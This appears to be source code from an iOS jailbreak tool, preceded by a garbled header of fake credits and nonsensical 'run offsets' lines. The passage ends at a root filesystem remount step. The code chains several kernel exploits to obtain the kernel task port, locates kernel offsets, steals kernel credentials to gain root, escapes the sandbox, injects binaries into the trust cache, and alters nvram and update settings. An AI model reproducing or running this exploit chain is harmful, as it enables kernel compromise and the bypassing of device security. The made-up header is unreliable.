created by pwn20wnd copyright act-2020
created by develous ham project no-113
jailbreak exploit offsets done by @jailedDEVAdNaN
created this file on 11/07/20
}
}
copyright act-2020}â‚¬
*run offsets from /var/tmp/-restore/application/-fs/generator {43380 B3"}
*run kernel execution from /var/application/kernel/kernel-exploit/execution {455670 X4"}
*verify kernel protocols from /var/mobile/containers/application/kernel/protocols/XML/8
*run root system files (00000382x880002q1)
#include "jailbreak.h"
#include <sys/snapshot.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <copyfile.h>
#include <spawn.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <libgen.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>
#include <sys/sysctl.h>
#include <mach-o/dyld.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/syscall.h>
#include <common.h>
#include <iokit.h>
#include <NSTask.h>
#include <MobileGestalt.h>
#include <netdb.h>
#include <reboot.h>
#import <snappy.h>
#import <inject.h>
#include <sched.h>
#import <patchfinder64.h>
#import <offsetcache.h>
#import <kerneldec.h>
#include <pwd.h>
#import "JailbreakViewController.h"
#include "KernelOffsets.h"
#include "empty_list_sploit.h"
#include "KernelMemory.h"
#include "KernelExecution.h"
#include "KernelUtilities.h"
#include "remote_memory.h"
#include "remote_call.h"
#include "unlocknvram.h"
#include "multi_path_sploit.h"
#include "async_wake.h"
#include "utils.h"
#include "ArchiveFile.h"
#include "FakeApt.h"
#include "voucher_swap.h"
#include "kernel_memory.h"
#include "kernel_slide.h"
#include "find_port.h"
#include "machswap_offsets.h"
#include "machswap_pwn.h"
#include "machswap2_pwn.h"
#include "prefs.h"

int stage = __COUNTER__;
extern int maxStage;

#define update_stage() do { \
    dispatch_async(dispatch_get_main_queue(), ^{ \
        [UIView performWithoutAnimation:^{ \
            [[[JailbreakViewController sharedController] jailbreakProgressBar] setProgress:(float)((float) stage/ (float) maxStage) animated:YES]; \
            [[[JailbreakViewController sharedController] jailbreakProgressBar] setProgress:(float)((float) stage/ (float) maxStage) animated:YES]; \
            [[JailbreakViewController sharedController] exploitProgressLabel].text = [NSString stringWithFormat:@"%d/%d", stage, maxStage]; \
        }]; \
    }); \
} while (false)

#define upstage() do { \
    __COUNTER__; \
    stage++; \
    update_stage(); \
} while (false)

#define find_offset(x, symbol, critical) do { \
    if (!KERN_POINTER_VALID(getoffset(x))) { \
        setoffset(x, find_symbol(symbol != NULL ? symbol : "_" #x)); \
    } \
    if (!KERN_POINTER_VALID(getoffset(x))) { \
        kptr_t (*_find_ ##x)(void) = dlsym(RTLD_DEFAULT, "find_" #x); \
        if (_find_ ##x != NULL) { \
            setoffset(x, _find_ ##x()); \
        } \
    } \
    if (KERN_POINTER_VALID(getoffset(x))) { \
        LOG(#x " = " ADDR " + " ADDR, getoffset(x), kernel_slide); \
        setoffset(x, getoffset(x) + kernel_slide); \
    } else { \
        setoffset(x, 0); \
        if (critical) { \
            _assert(false, localize(@"Unable to find kernel offset for " #x), true); \
        } \
    } \
} while (false)

void jailbreak()
{
    status(localize(@"Jailbreaking"), false, false);
    
    int rv = 0;
    bool usedPersistedKernelTaskPort = NO;
    pid_t const my_pid = getpid();
    uid_t const my_uid = getuid();
    host_t myHost = HOST_NULL;
    host_t myOriginalHost = HOST_NULL;
    kptr_t myProcAddr = KPTR_NULL;
    kptr_t myOriginalCredAddr = KPTR_NULL;
    kptr_t myCredAddr = KPTR_NULL;
    kptr_t kernelCredAddr = KPTR_NULL;
    kptr_t Shenanigans = KPTR_NULL;
    prefs_t *prefs = copy_prefs();
    bool needStrap = NO;
    bool needSubstitutor = NO;
    bool skipSubstitutor = NO;
    NSString *const homeDirectory = NSHomeDirectory();
    NSString *const temporaryDirectory = NSTemporaryDirectory();
    NSMutableArray *debsToInstall = [NSMutableArray new];
    NSMutableString *status = [NSMutableString new];
    bool const betaFirmware = isBetaFirmware();
    time_t const start_time = time(NULL);
    JailbreakViewController *sharedController = [JailbreakViewController sharedController];
    NSMutableArray *resources = [NSMutableArray new];
    NSFileManager *const fileManager = [NSFileManager defaultManager];
    bool const doInject = (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_12_0);
    const char *success_file = [temporaryDirectory stringByAppendingPathComponent:@"jailbreak.completed"].UTF8String;
    NSString *const NSJailbreakDirectory = @"/jb";
    const char *jailbreakDirectory = NSJailbreakDirectory.UTF8String;
    struct passwd *const root_pw = getpwnam("root");
    struct passwd *const mobile_pw = getpwnam("mobile");
    substitutor_info_t *substitutor = NULL;
    _assert(my_uid == mobile_pw->pw_uid, localize(@"Unable to verify my user id."), true);
#define NSJailbreakFile(x) ([NSJailbreakDirectory stringByAppendingPathComponent:x])
#define jailbreak_file(x) (NSJailbreakFile(@(x)).UTF8String)
    _assert(clean_file(success_file), localize(@"Unable to clean success file."), true);
#define insertstatus(x) do { [status appendString:x]; } while (false)
#define sync_prefs() do { _assert(set_prefs(prefs), localize(@"Unable to synchronize app preferences. Please restart the app and try again."), true); } while (false)
#define write_test_file(file) do { \
    _assert(create_file(file, root_pw->pw_uid, 0644), localize(@"Unable to create test file."), true); \
    _assert(clean_file(file), localize(@"Unable to clean test file."), true); \
} while (false)
#define inject_trust_cache() do { \
    if (toInjectToTrustCache.count <= 0) break; \
    LOG("Injecting %lu files to trust cache", toInjectToTrustCache.count); \
    _assert(injectTrustCache(toInjectToTrustCache, getoffset(trustcache), pmap_load_trust_cache) == 0, localize(@"Unable to inject trust cache"), true); \
    LOG("Injected %lu files to trust cache", toInjectToTrustCache.count); \
    [toInjectToTrustCache removeAllObjects]; \
    injectedToTrustCache = true; \
} while(false)
    
    upstage();
    
    {
        // Exploit kernel.
        
        progress(localize(@"Exploiting kernel..."));
        bool exploit_success = NO;
        myHost = mach_host_self();
        _assert(MACH_PORT_VALID(myHost), localize(@"Unable to get host port."), true);
        myOriginalHost = myHost;
        if (restore_kernel_task_port(&tfp0) &&
            restore_kernel_base(&kernel_base, &kernel_slide) &&
            restore_kernel_offset_cache()) {
            usedPersistedKernelTaskPort = YES;
            exploit_success = YES;
        } else {
            switch (prefs->exploit) {
                case empty_list_exploit: {
                    if (vfs_sploit() &&
                        MACH_PORT_VALID(tfp0) &&
                        KERN_POINTER_VALID(kernel_base = find_kernel_base())) {
                        exploit_success = YES;
                    }
                    break;
                }
                case multi_path_exploit: {
                    if (mptcp_go() &&
                        MACH_PORT_VALID(tfp0) &&
                        KERN_POINTER_VALID(kernel_base = find_kernel_base())) {
                        exploit_success = YES;
                    }
                    break;
                }
                case async_wake_exploit: {
                    if (async_wake_go() &&
                        MACH_PORT_VALID(tfp0) &&
                        KERN_POINTER_VALID(kernel_base = find_kernel_base())) {
                        exploit_success = YES;
                    }
                    break;
                }
                case voucher_swap_exploit: {
                    voucher_swap();
                    if (MACH_PORT_VALID(tfp0) &&
                        kernel_slide_init() &&
                        kernel_slide != -1 &&
                        KERN_POINTER_VALID(kernel_base = (kernel_slide + STATIC_KERNEL_BASE_ADDRESS))) {
                        exploit_success = YES;
                    }
                    break;
                }
                case mach_swap_exploit: {
                    machswap_offsets_t *const machswap_offsets = get_machswap_offsets();
                    if (machswap_offsets != NULL &&
                        machswap_exploit(machswap_offsets) == ERR_SUCCESS &&
                        MACH_PORT_VALID(tfp0) &&
                        KERN_POINTER_VALID(kernel_base)) {
                        exploit_success = YES;
                    }
                    break;
                }
                case mach_swap_2_exploit: {
                    machswap_offsets_t *const machswap_offsets = get_machswap_offsets();
                    if (machswap_offsets != NULL &&
                        machswap2_exploit(machswap_offsets) == ERR_SUCCESS &&
                        MACH_PORT_VALID(tfp0) &&
                        KERN_POINTER_VALID(kernel_base)) {
                        exploit_success = YES;
                    }
                    break;
                }
                default: {
                    notice(localize(@"No exploit selected."), false, false);
                    status(localize(@"Jailbreak"), true, true);
                    return;
                    break;
                }
            }
        }
        if (kernel_slide == -1 && kernel_base != -1) kernel_slide = (kernel_base - STATIC_KERNEL_BASE_ADDRESS);
        LOG("tfp0: 0x%x", tfp0);
        LOG("kernel_base: " ADDR, kernel_base);
        LOG("kernel_slide: " ADDR, kernel_slide);
        if (exploit_success && !verify_tfp0()) {
            LOG("Unable to verify TFP0.");
            exploit_success = NO;
        }
        if (exploit_success && ReadKernel32(kernel_base) != MACH_HEADER_MAGIC) {
            LOG("Unable to verify kernel_base.");
            exploit_success = NO;
        }
        if (!exploit_success) {
            notice(localize(@"Unable to exploit kernel. This is not an error. Reboot and try again."), true, false);
            exit(EXIT_FAILURE);
            _assert(false, localize(@"Unable to exit."), true);
        }
        insertstatus(localize(@"Exploited kernel.\n"));
        LOG("Successfully exploited kernel.");
    }
    
    upstage();
    
    {
        if (!found_offsets) {
            // Initialize patchfinder.
            
            progress(localize(@"Initializing patchfinder..."));
            char *const original_kernel_cache_path = "/System/Library/Caches/com.apple.kernelcaches/kernelcache";
            const char *decompressed_kernel_cache_path = [homeDirectory stringByAppendingPathComponent:@"Documents/kernelcache.dec"].UTF8String;
            if (!canRead(decompressed_kernel_cache_path)) {
                kptr_t sandbox = KPTR_NULL;
                if (!canRead(original_kernel_cache_path)) {
                    sandbox = swap_sandbox_for_proc(proc_struct_addr(), KPTR_NULL);
                }
                FILE *const original_kernel_cache = fopen(original_kernel_cache_path, "rb");
                _assert(original_kernel_cache != NULL, localize(@"Unable to open original kernelcache for reading."), true);
                FILE *const decompressed_kernel_cache = fopen(decompressed_kernel_cache_path, "w+b");
                _assert(decompressed_kernel_cache != NULL, localize(@"Unable to open decompressed kernelcache for writing."), true);
                _assert(decompress_kernel(original_kernel_cache, decompressed_kernel_cache, NULL, true) == ERR_SUCCESS, localize(@"Unable to decompress kernelcache."), true);
                fclose(decompressed_kernel_cache);
                fclose(original_kernel_cache);
                if (KERN_POINTER_VALID(sandbox)) {
                    swap_sandbox_for_proc(proc_struct_addr(), sandbox);
                }
            }
            char *kernelVersion = getKernelVersion();
            _assert(kernelVersion != NULL, localize(@"Unable to get kernel version."), true);
            if (init_kernel(NULL, KPTR_NULL, decompressed_kernel_cache_path) != ERR_SUCCESS ||
                find_strref(kernelVersion, 1, string_base_const, true, false) == KPTR_NULL) {
                _assert(clean_file(decompressed_kernel_cache_path), localize(@"Unable to clean corrupted kernelcache."), true);
                _assert(false, localize(@"Unable to initialize patchfinder."), true);
            }
            SafeFreeNULL(kernelVersion);
            LOG("Successfully initialized patchfinder.");
        } else {
            auth_ptrs = getoffset(auth_ptrs);
            monolithic_kernel = getoffset(monolithic_kernel);
        }
        if (auth_ptrs) {
            setoffset(auth_ptrs, true);
            LOG("Detected authentication pointers.");
            pmap_load_trust_cache = _pmap_load_trust_cache;
            sync_prefs();
        }
        if (monolithic_kernel) {
            setoffset(monolithic_kernel, true);
            LOG("Detected monolithic kernel.");
        }
        offset_options = getoffset(unrestrict-options);
        if (!offset_options) {
            offset_options = kmem_alloc(sizeof(kptr_t));
            wk64(offset_options, KPTR_NULL);
            setoffset(unrestrict-options, offset_options);
        }
        if (prefs->enable_get_task_allow) {
            SETOPT(GET_TASK_ALLOW);
        } else {
            UNSETOPT(GET_TASK_ALLOW);
        }
        if (prefs->set_cs_debugged) {
            SETOPT(CS_DEBUGGED);
        } else {
            UNSETOPT(CS_DEBUGGED);
        }
    }
    
    upstage();
    
    if (!found_offsets) {
        // Find offsets.
        
        progress(localize(@"Finding offsets..."));
        setoffset(kernel_base, kernel_base);
        setoffset(kernel_slide, kernel_slide);
        find_offset(trustcache, NULL, true);
        find_offset(OSBoolean_True, NULL, true);
        find_offset(osunserializexml, NULL, true);
        find_offset(smalloc, NULL, true);
        if (!auth_ptrs) {
            find_offset(add_x0_x0_0x40_ret, NULL, true);
        }
        find_offset(zone_map_ref, NULL, true);
        find_offset(vfs_context_current, NULL, true);
        find_offset(vnode_lookup, NULL, true);
        find_offset(vnode_put, NULL, true);
        find_offset(kernel_task, NULL, true);
        find_offset(shenanigans, NULL, true);
        if (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_12_0) {
            find_offset(vnode_get_snapshot, NULL, true);
            find_offset(fs_lookup_snapshot_metadata_by_name_and_return_name, NULL, true);
            find_offset(apfs_jhash_getvnode, NULL, true);
        }
        if (auth_ptrs) {
            find_offset(pmap_load_trust_cache, NULL, true);
            find_offset(paciza_pointer__l2tp_domain_module_start, NULL, true);
            find_offset(paciza_pointer__l2tp_domain_module_stop, NULL, true);
            find_offset(l2tp_domain_inited, NULL, true);
            find_offset(sysctl__net_ppp_l2tp, NULL, true);
            find_offset(sysctl_unregister_oid, NULL, true);
            find_offset(mov_x0_x4__br_x5, NULL, true);
            find_offset(mov_x9_x0__br_x1, NULL, true);
            find_offset(mov_x10_x3__br_x6, NULL, true);
            find_offset(kernel_forge_pacia_gadget, NULL, true);
            find_offset(kernel_forge_pacda_gadget, NULL, true);
            find_offset(IOUserClient__vtable, NULL, true);
            find_offset(IORegistryEntry__getRegistryEntryID, NULL, true);
        }
        find_offset(lck_mtx_lock, NULL, true);
        find_offset(lck_mtx_unlock, NULL, true);
        find_offset(proc_find, NULL, true);
        find_offset(proc_rele, NULL, true);
        find_offset(extension_create_file, NULL, true);
        find_offset(extension_add, NULL, true);
        find_offset(extension_release, NULL, true);
        find_offset(sfree, NULL, true);
        find_offset(sstrdup, NULL, true);
        find_offset(strlen, NULL, true);
        find_offset(issue_extension_for_mach_service, NULL, true);
        find_offset(issue_extension_for_absolute_path, NULL, true);
        find_offset(IOMalloc, NULL, true);
        find_offset(IOFree, NULL, true);
        found_offsets = true;
        LOG("Successfully found offsets.");
        
        // Deinitialize patchfinder.
        term_kernel();
    }
    
    upstage();
    
    {
        // Initialize jailbreak.
        kptr_t const ShenanigansPatch = 0xca13feba37be;
        
        progress(localize(@"Initializing jailbreak..."));
        LOG("Escaping sandbox...");
        myProcAddr = proc_struct_addr();
        LOG("myProcAddr = " ADDR, myProcAddr);
        _assert(KERN_POINTER_VALID(myProcAddr), localize(@"Unable to find my process in kernel memory."), true);
        kernelCredAddr = get_kernel_cred_addr();
        LOG("kernelCredAddr = " ADDR, kernelCredAddr);
        _assert(KERN_POINTER_VALID(kernelCredAddr), localize(@"Unable to find kernel's credentials in kernel memory."), true);
        Shenanigans = ReadKernel64(getoffset(shenanigans));
        LOG("Shenanigans = " ADDR, Shenanigans);
        _assert(KERN_POINTER_VALID(Shenanigans) || Shenanigans == ShenanigansPatch, localize(@"Unable to verify shenanigans in kernel memory."), true);
        if (Shenanigans != kernelCredAddr) {
            LOG("Detected corrupted shenanigans pointer.");
            Shenanigans = kernelCredAddr;
        }
        _assert(WriteKernel64(getoffset(shenanigans), ShenanigansPatch), localize(@"Unable to overwrite shenanigans in kernel memory."), true);
        myCredAddr = kernelCredAddr;
        myOriginalCredAddr = give_creds_to_process_at_addr(myProcAddr, myCredAddr);
        LOG("myOriginalCredAddr = " ADDR, myOriginalCredAddr);
        _assert(KERN_POINTER_VALID(myOriginalCredAddr), localize(@"Unable to steal kernel's credentials."), true);
        _assert(setuid(root_pw->pw_uid) == ERR_SUCCESS, localize(@"Unable to set user id."), true);
        _assert(getuid() == root_pw->pw_uid, localize(@"Unable to verify user id."), true);
        myHost = mach_host_self();
        _assert(MACH_PORT_VALID(myHost), localize(@"Unable to upgrade host port."), true);
        LOG("Successfully escaped sandbox.");
        LOG("Initializing kernel code execution...");
        _assert(init_kexec(), localize(@"Unable to initialize kernel code execution."), true);
        LOG("Successfully initialized kernel code execution.");
        LOG("Setting HSP4 as TFP0...");
        _assert(set_hsp4(tfp0), localize(@"Unable to set HSP4."), true);
        LOG("Successfully set HSP4 as TFP0.");
        insertstatus(localize(@"Set HSP4 as TFP0.\n"));
        LOG("Setting kernel task info...");
        _assert(set_kernel_task_info(), localize(@"Unable to set kernel task info."), true);
        LOG("Successfully set kernel task info.");
        insertstatus(localize(@"Set kernel task info.\n"));
        LOG("Platformizing...");
        _assert(set_platform_binary(myProcAddr, true), localize(@"Unable to make my task a platform task."), true);
        _assert(set_cs_platform_binary(myProcAddr, true), localize(@"Unable to make my codesign blob a platform blob."), true);
        LOG("Successfully initialized jailbreak.");
    }
    
    upstage();
    
    {
        if (prefs->export_kernel_task_port) {
            // Export kernel task port.
            progress(localize(@"Exporting kernel task port..."));
            _assert(export_tfp0(myOriginalHost), localize(@"Unable to export TFP0."), true);
            LOG("Successfully exported kernel task port.");
            insertstatus(localize(@"Exported kernel task port.\n"));
        } else {
            // Unexport kernel task port.
            progress(localize(@"Unexporting kernel task port..."));
            _assert(unexport_tfp0(myOriginalHost), localize(@"Unable to unexport TFP0."), true);
            LOG("Successfully unexported kernel task port.");
            insertstatus(localize(@"Unexported kernel task port.\n"));
        }
    }
    
    upstage();
    
    {
        // Write a test file to UserFS.
        
        progress(localize(@"Writing a test file to UserFS..."));
        const char *testFile = [NSString stringWithFormat:@"/var/mobile/test-%lu.txt", time(NULL)].UTF8String;
        write_test_file(testFile);
        LOG("Successfully wrote a test file to UserFS.");
    }
    
    upstage();
    
    {
        if (prefs->dump_apticket) {
            NSString *const originalFile = @"/System/Library/Caches/apticket.der";
            NSString *const dumpFile = [homeDirectory stringByAppendingPathComponent:@"Documents/apticket.der"];
            if (![sha1sum(originalFile) isEqualToString:sha1sum(dumpFile)]) {
                // Dump APTicket.
                
                progress(localize(@"Dumping APTicket..."));
                NSData *const fileData = [NSData dataWithContentsOfFile:originalFile];
                _assert(([fileData writeToFile:dumpFile atomically:YES]), localize(@"Unable to dump APTicket."), true);
                LOG("Successfully dumped APTicket.");
            }
            insertstatus(localize(@"Dumped APTicket.\n"));
        }
    }
    
    upstage();
    
    {
        if (prefs->overwrite_boot_nonce) {
            // Unlock nvram.
            
            progress(localize(@"Unlocking nvram..."));
            _assert(unlocknvram() == ERR_SUCCESS, localize(@"Unable to unlock nvram."), true);
            LOG("Successfully unlocked nvram.");
            
            _assert(runCommand("/usr/sbin/nvram", "-p", NULL) == ERR_SUCCESS, localize(@"Unable to print nvram variables."), true);
            char *const bootNonceKey = "com.apple.System.boot-nonce";
            if (runCommand("/usr/sbin/nvram", bootNonceKey, NULL) != ERR_SUCCESS ||
                strstr(lastSystemOutput.bytes, prefs->boot_nonce) == NULL) {
                // Set boot-nonce.
                
                progress(localize(@"Setting boot-nonce..."));
                _assert(runCommand("/usr/sbin/nvram", [NSString stringWithFormat:@"%s=%s", bootNonceKey, prefs->boot_nonce].UTF8String, NULL) == ERR_SUCCESS, localize(@"Unable to set boot nonce."), true);
                _assert(runCommand("/usr/sbin/nvram", [NSString stringWithFormat:@"%s=%s", kIONVRAMForceSyncNowPropertyKey, bootNonceKey].UTF8String, NULL) == ERR_SUCCESS, localize(@"Unable to synchronize boot nonce."), true);
                LOG("Successfully set boot-nonce.");
            }
            _assert(runCommand("/usr/sbin/nvram", "-p", NULL) == ERR_SUCCESS, localize(@"Unable to print new nvram variables."), true);
            
            // Lock nvram.
            
            progress(localize(@"Locking nvram..."));
            _assert(locknvram() == ERR_SUCCESS, localize(@"Unable to lock nvram."), true);
            LOG("Successfully locked nvram.");
            
            insertstatus(localize(@"Overwrote boot nonce.\n"));
        }
    }
    
    upstage();
    
    {
        // Log slide.
        
        progress(localize(@"Logging slide..."));
        NSString *const file = @(SLIDE_FILE);
        NSData *const fileData = [[NSString stringWithFormat:@(ADDR "\n"), kernel_slide] dataUsingEncoding:NSUTF8StringEncoding];
        if (![[NSData dataWithContentsOfFile:file] isEqual:fileData]) {
            _assert(clean_file(file.UTF8String), localize(@"Unable to clean old kernel slide log."), true);
            _assert(create_file_data(file.UTF8String, root_pw->pw_uid, 0644, fileData), localize(@"Unable to log kernel slide."), true);
        }
        LOG("Successfully logged slide.");
        insertstatus(localize(@"Logged slide.\n"));
    }
    
    upstage();
    
    {
        // Log ECID.
        
        progress(localize(@"Logging ECID..."));
        NSString *const ECID = getECID();
        if (ECID != nil) {
            prefs->ecid = ECID.UTF8String;
            sync_prefs();
        } else {
            LOG("I couldn't get the ECID... Am I running on a real device?");
        }
        LOG("Successfully logged ECID.");
        insertstatus(localize(@"Logged ECID.\n"));
    }
    
    upstage();
    
    {
        NSArray *const array = @[@"/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate",
                                 @"/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation",
                                 @"/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate",
                                 @"/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation"];
        if (prefs->disable_auto_updates) {
            // Disable Auto Updates.
            
            progress(localize(@"Disabling Auto Updates..."));
            for (id path in array) {
                ensure_symlink("/dev/null", [path UTF8String]);
            }
            _assert(modifyPlist(@"/var/mobile/Library/Preferences/com.apple.Preferences.plist", ^(id plist) {
                plist[@"kBadgedForSoftwareUpdateKey"] = @NO;
                plist[@"kBadgedForSoftwareUpdateJumpOnceKey"] = @NO;
            }), localize(@"Unable to disable software update badge."), true);
            LOG("Successfully disabled Auto Updates.");
            insertstatus(localize(@"Disabled Auto Updates.\n"));
        } else {
            // Enable Auto Updates.
            
            progress(localize(@"Enabling Auto Updates..."));
            for (id path in array) {
                ensure_directory([path UTF8String], root_pw->pw_uid, 0755);
            }
            _assert(modifyPlist(@"/var/mobile/Library/Preferences/com.apple.Preferences.plist", ^(id plist) {
                plist[@"kBadgedForSoftwareUpdateKey"] = @YES;
                plist[@"kBadgedForSoftwareUpdateJumpOnceKey"] = @YES;;
            }), localize(@"Unable to enable software update badge."), true);
            insertstatus(localize(@"Enabled Auto Updates.\n"));
        }
    }
    
    upstage();
    
    {
        // Remount RootFS.
